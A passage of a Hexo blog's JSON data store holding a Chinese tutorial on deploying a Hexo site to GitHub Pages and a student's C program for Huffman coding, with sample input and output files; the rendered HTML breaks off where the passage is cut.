ms"}},"local_search":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":true,"preload":true},"swiftype_key":null,"chatra":{"enable":false,"async":true,"id":null},"tidio":{"enable":false,"key":null},"note":{"style":"simple","icons":false,"border_radius":3,"light_bg_offset":0},"tabs":{"transition":{"tabs":false,"labels":true},"border_radius":0},"pdf":{"enable":false,"height":"500px"},"mermaid":{"enable":false,"theme":"forest"},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"pace":{"enable":false,"theme":"minimal"},"three":{"enable":false,"three_waves":false,"canvas_lines":false,"canvas_sphere":false},"canvas_nest":{"enable":false,"onmobile":true,"color":"0,0,255","opacity":0.5,"zIndex":-1,"count":99},"canvas_ribbon":{"enable":false,"size":300,"alpha":0.6,"zIndex":-1},"vendors":{"_internal":"lib","anime":null,"fontawesome":null,"mathjax":null,"mhchem":null,"katex":null,"copy_tex_js":null,"copy_tex_css":null,"pjax":null,"jquery":null,"fancybox":null,"fancybox_css":null,"mediumzoom":null,"lazyload":null,"pangu":null,"quicklink":null,"disqusjs_js":null,"disqusjs_css":null,"valine":null,"gitalk_js":null,"gitalk_css":null,"algolia_instant_js":null,"algolia_instant_css":null,"pdfobject":null,"mermaid":null,"velocity":null,"velocity_ui":null,"pace":null,"pace_css":null,"three":null,"three_waves":null,"canvas_lines":null,"canvas_sphere":null,"canvas_nest":null,"canvas_nest_nomobile":null,"canvas_ribbon":null},"css":"css","js":"js","images":"images","crash_cheat":true,"clicklove":true,"snow":false}}},"length":1118,"excerpt":"<h3 id=\"准备工作\"><a href=\"#准备工作\" class=\"headerlink\" title=\"准备工作\"></a>准备工作</h3><h4 id=\"GitHub\"><a href=\"#GitHub\" class=\"headerlink\" title=\"GitHub\"></a>GitHub</h4><p>注册一个 GitHub 账号，创建一个新的仓库，仓库名称严格命名为<code>todest.github.io</code>，<code>todest</code>为用户名，修改成你自己的。</p>\n<h4 id=\"Git\"><a href=\"#Git\" class=\"headerlink\" title=\"Git\"></a>Git</h4><p>从此处 <a href=\"https://git-scm.com/\">Git官网</a> 下载并安装，右键打开<code>Git Bash</code>。<br>","more":"</p>\n<h5 id=\"配置SSH\"><a href=\"#配置SSH\" class=\"headerlink\" title=\"配置SSH\"></a>配置SSH</h5><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ssh-keygen -t rsa -C <span class=\"string\">&quot;邮件地址&quot;</span>\t\t<span class=\"comment\"># 连续回车</span></span><br></pre></td></tr></table></figure>\n<p>将<code>&quot;C:\\Users\\你的用户名\\.ssh\\id_rsa.pub&quot;</code>的内容复制下来，打开<code>GitHub设置-&gt;SSH and GPG keys-&gt;New SSH key</code>，粘贴到此处确定。<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ssh -T git@github.com</span><br><span class=\"line\"><span class=\"comment\"># 测试SSH是否配置好</span></span><br><span class=\"line\"><span class=\"comment\"># 看到You&#x27;ve successfully authenticated, but GitHub does not provide shell access.</span></span><br><span class=\"line\"><span class=\"comment\"># 则说明配置好了，否则无法使用hexo d</span></span><br></pre></td></tr></table></figure></p>\n<h4 id=\"Node-js\"><a href=\"#Node-js\" class=\"headerlink\" title=\"Node.js\"></a>Node.js</h4><p>从 <a href=\"https://nodejs.org\">Node.js官网</a> 下载安装。</p>\n<h4 id=\"安装Hexo\"><a href=\"#安装Hexo\" class=\"headerlink\" title=\"安装Hexo\"></a>安装Hexo</h4><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">npm install hexo-cli -g</span><br></pre></td></tr></table></figure>\n<p><code>install</code>可简写为 <code>i</code> 。</p>\n<h4 id=\"初始化Hexo\"><a href=\"#初始化Hexo\" class=\"headerlink\" title=\"初始化Hexo\"></a>初始化Hexo</h4><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">hexo init Blog\t\t\t\t\t<span class=\"comment\"># Blog可以修改成其他的名字</span></span><br><span class=\"line\"><span class=\"built_in\">cd</span> Blog\t\t\t\t\t\t<span class=\"comment\"># 进入Blog文件夹</span></span><br></pre></td></tr></table></figure>\n<h4 id=\"安装Hexo扩展\"><a href=\"#安装Hexo扩展\" class=\"headerlink\" title=\"安装Hexo扩展\"></a>安装Hexo扩展</h4><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">npm install hexo-deployer-git --save</span><br><span class=\"line\">npm install</span><br></pre></td></tr></table></figure>\n<h3 id=\"部署\"><a href=\"#部署\" class=\"headerlink\" title=\"部署\"></a>部署</h3><h4 id=\"本地调试\"><a href=\"#本地调试\" class=\"headerlink\" title=\"本地调试\"></a>本地调试</h4><p>以下<code>g</code>是<code>generate</code>的缩写，<code>s</code>是<code>start</code>的缩写，<code>d</code>是<code>deploy</code>的缩写。<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">hexo clean</span><br><span class=\"line\">hexo g\t\t\t\t\t\t<span class=\"comment\"># 生成  此条和后一条可简写为 hexo s -g</span></span><br><span class=\"line\">hexo s\t\t\t\t\t\t<span class=\"comment\"># 预览</span></span><br></pre></td></tr></table></figure><br><code>hexo s</code>是开启本地预览服务，打开浏览器访问 <a href=\"http://localhost:4000\">http://localhost:4000</a> 即可看到内容。</p>\n<h4 id=\"上传到GitHub-Pages\"><a href=\"#上传到GitHub-Pages\" class=\"headerlink\" title=\"上传到GitHub Pages\"></a>上传到GitHub Pages</h4><p>上传之前，打开站点配置文件<code>_config.yml</code>，位于站点根目录下，修改最后一部分为如下部分。<br><figure class=\"highlight yaml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">deploy:</span></span><br><span class=\"line\">  <span class=\"attr\">type:</span> <span class=\"string\">git</span></span><br><span class=\"line\">  <span class=\"attr\">repository:</span> <span class=\"string\">git@github.com:todest/todest.github.io.git</span>    <span class=\"comment\"># 修改为你的GitHub用户名</span></span><br><span class=\"line\">  <span class=\"attr\">branch:</span> <span class=\"string\">master</span></span><br></pre></td></tr></table></figure><br>上传到<code>GitHub Pages</code>。<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">hexo clean</span><br><span class=\"line\">hexo g\t\t\t\t\t\t<span class=\"comment\"># 此条和后一条可简写为 hexo d -g</span></span><br><span class=\"line\">hexo d</span><br></pre></td></tr></table></figure></p>\n<h4 id=\"修改主题\"><a href=\"#修改主题\" class=\"headerlink\" title=\"修改主题\"></a>修改主题</h4><p>主题位置<code>themes</code>目录下，默认为<code>landscape</code>主题。可从官网 <a href=\"https://hexo.io/themes/\">https://hexo.io/themes/</a> 下载，推荐<code>NexT</code>主题，以下为安装方法。<br>安装过程就一行代码，站点根目录下运行。<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git <span class=\"built_in\">clone</span> https://github.com/theme-next/hexo-theme-next themes/next</span><br></pre></td></tr></table></figure><br>打开站点配置文件<code>_config.yml</code>，找到<code>theme： landscape</code>，修改为<code>next</code>就可以了。</p>"},{"title":"哈夫曼编码","date":"2019-03-29T09:11:09.000Z","abbrlink":"49558830","updated":"2020-04-08T10:40:24.000Z","_content":"# 哈夫曼编码\n**以下为数据结构作业**\n如有错误，请指出，谢谢！\n<!--more-->\n```cpp\n#include<stdio.h>\n#include<stdlib.h>\n#include<string.h>\nchar key[200];\ntypedef struct\n{\n\tunsigned int weight;\n\tunsigned int parent,LChild,RChild;\n}HTNode,*HuffmanTree;\ntypedef char *HuffmanCode;\nvoid Select(HuffmanTree *ht,int n,int *s1,int *s2)\n{\n\tint i,min;\n\tfor(i=1;i<=n;i++)\n\t{\n\t\tif((*ht)[i].parent==0)\n\t\t{\n\t\t\tmin=i;\n\t\t\tbreak;\n\t\t}\n\t}\n\tfor(i=1;i<=n;i++)\n\t{\n\t\tif((*ht)[i].parent==0)\n\t\t{\n\t\t\tif((*ht)[i].weight<(*ht)[min].weight)\n\t\t\t\tmin=i;\n\t\t}\n\t}\n\t*s1=min;\n\n\tfor(i=1;i<=n;i++)\n\t{\n\t\tif((*ht)[i].parent==0&&i!=(*s1))\n\t\t{\n\t\t\tmin=i;\n\t\t\tbreak;\n\t\t}\n\t}\n\tfor(i=1;i<=n;i++)\n\t{\n\t\tif((*ht)[i].parent==0&&i!=*s1)\n\t\t{\n\t\t\tif((*ht)[i].weight<(*ht)[min].weight)\n\t\t\t\tmin=i;\n\t\t}\n\t}\n\t*s2=min;\n}\nvoid CrtHuffmanTree(HuffmanTree *ht,int *w,int n)\n{\n\tint m=2*n-1,i,s1,s2;\n\t*ht\t=(HuffmanTree) malloc((m+1)*sizeof(HTNode));\n\tfor(i=1;i<=n;i++)\n\t{\n\t\t(*ht)[i].weight=w[i];\n\t\t(*ht)[i].LChild=0;\n\t\t(*ht)[i].parent=0;\n\t\t(*ht)[i].RChild=0;\n\t}\n\tfor(i=n+1;i<=m;i++)\n\t{\n\t\t(*ht)[i].weight=0;\n\t\t(*ht)[i].LChild=0;\n\t\t(*ht)[i].parent=0;\n\t\t(*ht)[i].RChild=0;\n\t}\n\tFILE *fp;\n\tfp=fopen(\"Code.txt\",\"w\");\n\tfprintf(fp,\"哈夫曼树为: \\n\");\n\tfor(i=n+1;i<=m;i++)\n\t{\n\t\tSelect(ht,i-1,&s1,&s2);\n\t\t(*ht)[s1].parent=i;\n\t\t(*ht)[s2].parent=i;\n\t\t(*ht)[i].LChild=s1;\n\t\t(*ht)[i].RChild=s2;\n\t\t(*ht)[i].weight=(*ht)[s1].weight +(*ht)[s2].weight;\n\t\tfprintf(fp,\"%d(%d,%d)\\n\",(*ht)[i].weight,(*ht)[s1].weight,(*ht)[s2].weight);\n\t}\n\tfprintf(fp,\"\\n\");\n\tfclose(fp);\n}\nvoid CrtHuffmanCode(HuffmanTree *ht,HuffmanCode *hc,int n)\n{\n\tchar *cd;\n\tint a[100];\n\tint i,start,p,w=0;\n\tunsigned int c;\n\thc=(HuffmanCode *)malloc((n+1)*sizeof(char *));\n\tcd=(char *) malloc(n*sizeof(char));\n\tcd[n-1]='\\0';\n\tfor(i=1;i<=n;i++)\n\t{\n\t\ta[i]=0;\n\t\tstart=n - 1;\n\t\tfor(c=i,p=(*ht)[i].parent;p != 0;c=p,p=(*ht)[p].parent)\n\t\t{\n\t\t\tif((*ht)[p].LChild==c)\n\t\t\t{\n\t\t\t\tcd[--start]='0';\n\t\t\t\ta[i]++;\n\t\t\t}\n\t\t\telse\n\t\t\t{\n\t\t\t\tcd[--start]='1';\n\t\t\t\ta[i]++;\n\t\t\t}\n\t\t}\n\t\thc[i]=(char *) malloc((n - start)*sizeof(char));\n\t\tstrcpy(hc[i],&cd[start]);\n\t}\n\tfree(cd);\n\tFILE *fp,*sf,*rf;\n\tchar ch;\n\tfp=fopen(\"Code.txt\",\"a+\");\n\tfor(i=1;i<=n;i++)\n\t\tfprintf(fp,\"权值为%d的字母%c的哈夫曼编码为：%s\\n\",(*ht)[i].weight,key[i],hc[i]);\n\tfor(i=1;i<=n;i++)\n\t\tw+=(*ht)[i].weight*a[i];\n\tfprintf(fp,\"带权路径为：%d\\n\",w);\n\tfclose(fp);\n\tsf=fopen(\"SourceFile.txt\",\"r\");\n\trf=fopen(\"ResultFile.txt\",\"w\");\n\twhile(fscanf(sf,\"%c\",&ch)!=EOF)\n\t{\n\t\tfor(int i=1;i<=n;i++)\n\t\t{\n\t\t\tif(key[i]==ch)\n\t\t\t{\n\t\t\t\tfprintf(rf,\"%s\",hc[i]);\n\t\t\t\tbreak;\n\t\t\t}\n\t\t}\n\t}\n\tfclose(sf);\n\tfclose(rf);\n}\nint main()\n{\n\tHuffmanTree\tHT;\n\tHuffmanCode\tHC;\n\tint *w,i,N=0,S[200],k=0;\n\tchar ch;\n\tmemset(S,0,sizeof(S));\n\tFILE *fp;\n\tfp=fopen(\"SourceFile.txt\",\"r\");\n\twhile(fscanf(fp,\"%c\",&ch)!=EOF)S[ch]++;\n\tfor(int i='A';i<='Z';i++)if(S[i])N++;\n\tfclose(fp);\n\tw=(int *)malloc((N+1)*sizeof(int));\n\tfor(int i='A';i<='Z';i++)\n\t{\n\t\tif(S[i])\n\t\t{\n\t\t\tkey[++k]=i;\n\t\t\tw[k]=S[i];\n\t\t}\n\t}\n\tCrtHuffmanTree(&HT,w,N);\n\tCrtHuffmanCode(&HT,&HC,N);\n\treturn(0);\n}\n```\n<br/>\n**SourceFile.txt**\n```nohilight\nAAAAABBBBBBBBBBBBBBBBBBBBBBBBBCCCCCCCDDDDDDDDEEEEEEEEEEEEEEFFFFFFFFFFFFFFFFFFFFFGGGHHHHHHHHHHH\n```\n<br/>\n**Code.txt**\n```nohilight\n哈夫曼树为: \n8(3,5)\n15(7,8)\n19(8,11)\n29(14,15)\n40(19,21)\n54(25,29)\n94(40,54)\n\n权值为5的字母A的哈夫曼编码为：0001\n权值为25的字母B的哈夫曼编码为：10\n权值为7的字母C的哈夫曼编码为：1110\n权值为8的字母D的哈夫曼编码为：1111\n权值为14的字母E的哈夫曼编码为：110\n权值为21的字母F的哈夫曼编码为：01\n权值为3的字母G的哈夫曼编码为：0000\n权值为11的字母H的哈夫曼编码为：001\n带权路径为：259\n\n```\n<br/>\n**ResultFile.txt**\n```nohilight\n0001000100010001000110101010101010101010101010101010101010101010101010111011101110111011101110111011111111111111111111111111111111110110110110110110110110110110110110110110010101010101010101010101010101010101010101000000000000001001001001001001001001001001001\n```","source":"_posts/Huffman.md","raw":"---\ntitle: 哈夫曼编码\ndate: 2019-03-29 17:11:09\ncategories:\n  - 数据结构\ntags:\n  - 哈夫曼编码\nabbrlink: '49558830'\nupdated:\n---\n# 哈夫曼编码\n**以下为数据结构作业**\n如有错误，请指出，谢谢！\n<!--more-->\n```cpp\n#include<stdio.h>\n#include<stdlib.h>\n#include<string.h>\nchar key[200];\ntypedef struct\n{\n\tunsigned int weight;\n\tunsigned int parent,LChild,RChild;\n}HTNode,*HuffmanTree;\ntypedef char *HuffmanCode;\nvoid Select(HuffmanTree *ht,int n,int *s1,int *s2)\n{\n\tint i,min;\n\tfor(i=1;i<=n;i++)\n\t{\n\t\tif((*ht)[i].parent==0)\n\t\t{\n\t\t\tmin=i;\n\t\t\tbreak;\n\t\t}\n\t}\n\tfor(i=1;i<=n;i++)\n\t{\n\t\tif((*ht)[i].parent==0)\n\t\t{\n\t\t\tif((*ht)[i].weight<(*ht)[min].weight)\n\t\t\t\tmin=i;\n\t\t}\n\t}\n\t*s1=min;\n\n\tfor(i=1;i<=n;i++)\n\t{\n\t\tif((*ht)[i].parent==0&&i!=(*s1))\n\t\t{\n\t\t\tmin=i;\n\t\t\tbreak;\n\t\t}\n\t}\n\tfor(i=1;i<=n;i++)\n\t{\n\t\tif((*ht)[i].parent==0&&i!=*s1)\n\t\t{\n\t\t\tif((*ht)[i].weight<(*ht)[min].weight)\n\t\t\t\tmin=i;\n\t\t}\n\t}\n\t*s2=min;\n}\nvoid CrtHuffmanTree(HuffmanTree *ht,int *w,int n)\n{\n\tint m=2*n-1,i,s1,s2;\n\t*ht\t=(HuffmanTree) malloc((m+1)*sizeof(HTNode));\n\tfor(i=1;i<=n;i++)\n\t{\n\t\t(*ht)[i].weight=w[i];\n\t\t(*ht)[i].LChild=0;\n\t\t(*ht)[i].parent=0;\n\t\t(*ht)[i].RChild=0;\n\t}\n\tfor(i=n+1;i<=m;i++)\n\t{\n\t\t(*ht)[i].weight=0;\n\t\t(*ht)[i].LChild=0;\n\t\t(*ht)[i].parent=0;\n\t\t(*ht)[i].RChild=0;\n\t}\n\tFILE *fp;\n\tfp=fopen(\"Code.txt\",\"w\");\n\tfprintf(fp,\"哈夫曼树为: \\n\");\n\tfor(i=n+1;i<=m;i++)\n\t{\n\t\tSelect(ht,i-1,&s1,&s2);\n\t\t(*ht)[s1].parent=i;\n\t\t(*ht)[s2].parent=i;\n\t\t(*ht)[i].LChild=s1;\n\t\t(*ht)[i].RChild=s2;\n\t\t(*ht)[i].weight=(*ht)[s1].weight +(*ht)[s2].weight;\n\t\tfprintf(fp,\"%d(%d,%d)\\n\",(*ht)[i].weight,(*ht)[s1].weight,(*ht)[s2].weight);\n\t}\n\tfprintf(fp,\"\\n\");\n\tfclose(fp);\n}\nvoid CrtHuffmanCode(HuffmanTree *ht,HuffmanCode *hc,int n)\n{\n\tchar *cd;\n\tint a[100];\n\tint i,start,p,w=0;\n\tunsigned int c;\n\thc=(HuffmanCode *)malloc((n+1)*sizeof(char *));\n\tcd=(char *) malloc(n*sizeof(char));\n\tcd[n-1]='\\0';\n\tfor(i=1;i<=n;i++)\n\t{\n\t\ta[i]=0;\n\t\tstart=n - 1;\n\t\tfor(c=i,p=(*ht)[i].parent;p != 0;c=p,p=(*ht)[p].parent)\n\t\t{\n\t\t\tif((*ht)[p].LChild==c)\n\t\t\t{\n\t\t\t\tcd[--start]='0';\n\t\t\t\ta[i]++;\n\t\t\t}\n\t\t\telse\n\t\t\t{\n\t\t\t\tcd[--start]='1';\n\t\t\t\ta[i]++;\n\t\t\t}\n\t\t}\n\t\thc[i]=(char *) malloc((n - start)*sizeof(char));\n\t\tstrcpy(hc[i],&cd[start]);\n\t}\n\tfree(cd);\n\tFILE *fp,*sf,*rf;\n\tchar ch;\n\tfp=fopen(\"Code.txt\",\"a+\");\n\tfor(i=1;i<=n;i++)\n\t\tfprintf(fp,\"权值为%d的字母%c的哈夫曼编码为：%s\\n\",(*ht)[i].weight,key[i],hc[i]);\n\tfor(i=1;i<=n;i++)\n\t\tw+=(*ht)[i].weight*a[i];\n\tfprintf(fp,\"带权路径为：%d\\n\",w);\n\tfclose(fp);\n\tsf=fopen(\"SourceFile.txt\",\"r\");\n\trf=fopen(\"ResultFile.txt\",\"w\");\n\twhile(fscanf(sf,\"%c\",&ch)!=EOF)\n\t{\n\t\tfor(int i=1;i<=n;i++)\n\t\t{\n\t\t\tif(key[i]==ch)\n\t\t\t{\n\t\t\t\tfprintf(rf,\"%s\",hc[i]);\n\t\t\t\tbreak;\n\t\t\t}\n\t\t}\n\t}\n\tfclose(sf);\n\tfclose(rf);\n}\nint main()\n{\n\tHuffmanTree\tHT;\n\tHuffmanCode\tHC;\n\tint *w,i,N=0,S[200],k=0;\n\tchar ch;\n\tmemset(S,0,sizeof(S));\n\tFILE *fp;\n\tfp=fopen(\"SourceFile.txt\",\"r\");\n\twhile(fscanf(fp,\"%c\",&ch)!=EOF)S[ch]++;\n\tfor(int i='A';i<='Z';i++)if(S[i])N++;\n\tfclose(fp);\n\tw=(int *)malloc((N+1)*sizeof(int));\n\tfor(int i='A';i<='Z';i++)\n\t{\n\t\tif(S[i])\n\t\t{\n\t\t\tkey[++k]=i;\n\t\t\tw[k]=S[i];\n\t\t}\n\t}\n\tCrtHuffmanTree(&HT,w,N);\n\tCrtHuffmanCode(&HT,&HC,N);\n\treturn(0);\n}\n```\n<br/>\n**SourceFile.txt**\n```nohilight\nAAAAABBBBBBBBBBBBBBBBBBBBBBBBBCCCCCCCDDDDDDDDEEEEEEEEEEEEEEFFFFFFFFFFFFFFFFFFFFFGGGHHHHHHHHHHH\n```\n<br/>\n**Code.txt**\n```nohilight\n哈夫曼树为: \n8(3,5)\n15(7,8)\n19(8,11)\n29(14,15)\n40(19,21)\n54(25,29)\n94(40,54)\n\n权值为5的字母A的哈夫曼编码为：0001\n权值为25的字母B的哈夫曼编码为：10\n权值为7的字母C的哈夫曼编码为：1110\n权值为8的字母D的哈夫曼编码为：1111\n权值为14的字母E的哈夫曼编码为：110\n权值为21的字母F的哈夫曼编码为：01\n权值为3的字母G的哈夫曼编码为：0000\n权值为11的字母H的哈夫曼编码为：001\n带权路径为：259\n\n```\n<br/>\n**ResultFile.txt**\n```nohilight\n0001000100010001000110101010101010101010101010101010101010101010101010111011101110111011101110111011111111111111111111111111111111110110110110110110110110110110110110110110010101010101010101010101010101010101010101000000000000001001001001001001001001001001001\n```","slug":"Huffman","published":1,"comments":1,"layout":"post","photos":[],"link":"","_id":"ckieexkb0001aqse57oqcdy4u","content":"<h1 id=\"哈夫曼编码\"><a href=\"#哈夫曼编码\" class=\"headerlink\" title=\"哈夫曼编码\"></a>哈夫曼编码</h1><p><strong>以下为数据结构作业</strong><br>如有错误，请指出，谢谢！<br><a id=\"more\"></a><br><figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br><span class=\"line\">148</span><br><span class=\"line\">149</span><br><span class=\"line\">150</span><br><span class=\"line\">151</span><br><span class=\"line\">152</span><br><span class=\"line\">153</span><br><span class=\"line\">154</span><br><span class=\"line\">155</span><br><span class=\"line\">156</span><br><span class=\"line\">157</span><br><span class=\"line\">158</span><br><span class=\"line\">159</span><br><span class=\"line\">160</span><br><span class=\"line\">161</span><br><span class=\"line\">162</span><br><span class=\"line\">163</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;stdlib.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;string.h&gt;</span></span></span><br><span class=\"line\"><span class=\"keyword\">char</span> key[<span class=\"number\">200</span>];</span><br><span class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"class\"><span class=\"keyword\">struct</span></span></span><br><span class=\"line\"><span class=\"class\">&#123;</span></span><br><span class=\"line\">\t<span class=\"keyword\">unsigned</span> <span class=\"keyword\">int</span> weight;</span><br><span class=\"line\">\t<span class=\"keyword\">unsigned</span> <span class=\"keyword\">int</span> parent,LChild,RChild;</span><br><span class=\"line\">&#125;HTNode,*HuffmanTree;</span><br><span class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"keyword\">char</span> *HuffmanCode;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">Select</span><span class=\"params\">(HuffmanTree *ht,<span class=\"keyword\">int</span> n,<span class=\"keyword\">int</span> *s1,<span class=\"keyword\">int</span> *s2)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">int</span> i,min;</span><br><span class=\"line\">\t<span class=\"keyword\">for</span>(i=<span class=\"number\">1</span>;i&lt;=n;i++)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span>((*ht)[i].parent==<span class=\"number\">0</span>)</span><br><span class=\"line\">\t\t&#123;</span><br><span class=\"line\">\t\t\tmin=i;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">break</span>;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">for</span>(i=<span class=\"number\">1</span>;i&lt;=n;i++)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span>((*ht)[i].parent==<span class=\"number\">0</span>)</span><br><span class=\"line\">\t\t&#123;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">if</span>((*ht)[i].weight&lt;(*ht)[min].weight)</span><br><span class=\"line\">\t\t\t\tmin=i;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t*s1=min;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">for</span>(i=<span class=\"number\">1</span>;i&lt;=n;i++)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span>((*ht)[i].parent==<span class=\"number\">0</span>&amp;&amp;i!=(*s1))</span><br><span class=\"line\">\t\t&#123;</span><br><span class=\"line\">\t\t\tmin=i;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">break</span>;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">for</span>(i=<span class=\"number\">1</span>;i&lt;=n;i++)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span>((*ht)[i].parent==<span class=\"number\">0</span>&amp;&amp;i!=*s1)</span><br><span class=\"line\">\t\t&#123;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">if</span>((*ht)[i].weight&lt;(*ht)[min].weight)</span><br><span class=\"line\">\t\t\t\tmin=i;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t*s2=min;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span 